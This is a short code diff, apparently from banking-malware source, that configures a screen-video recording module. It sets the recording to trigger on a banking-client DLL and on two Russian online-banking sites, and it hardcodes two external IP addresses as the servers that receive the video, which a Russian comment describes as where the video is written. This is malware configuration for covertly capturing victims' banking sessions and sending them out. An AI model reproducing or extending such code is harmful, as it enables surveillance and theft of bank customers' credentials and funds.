@@ -31,8 +31,9 @@ namespace VIDEORECDEBUGSTRINGS
 #ifndef DEBUGCONFIG
 	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "VIDEO_REC_URLS\0";
 #else
-	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "*rambler.*\0"
-												  "*bsi.dll*\0\0";
+	char VIDEO_REC_URLS[MAX_VIDEO_REC_URLS_LEN] = "*bsi.dll*\0"
+												  "*ibank.alfabank.ru*\0"
+												  "*avangard.ru*\0\0";
 #endif
 
 
@@ -40,8 +41,8 @@ namespace VIDEORECDEBUGSTRINGS
 
 
 #ifdef DEBUGCONFIG
-	char VIDEO_REC_HOST1[MAX_VIDEO_REC_HOST_LEN] = "192.168.0.100\0"; //"127.0.0.1";//"178.162.179.65\0";
-	char VIDEO_REC_HOST2[MAX_VIDEO_REC_HOST_LEN] = "\0";
+	char VIDEO_REC_HOST1[] = "178.162.179.65"; 
+	char VIDEO_REC_HOST2[] = "188.72.202.163";
 #else
 	//Адрес сервера куда пишем видео
 	char VIDEO_REC_HOST1[MAX_VIDEO_REC_HOST_LEN] = "VIDEO_REC_HOST\0";
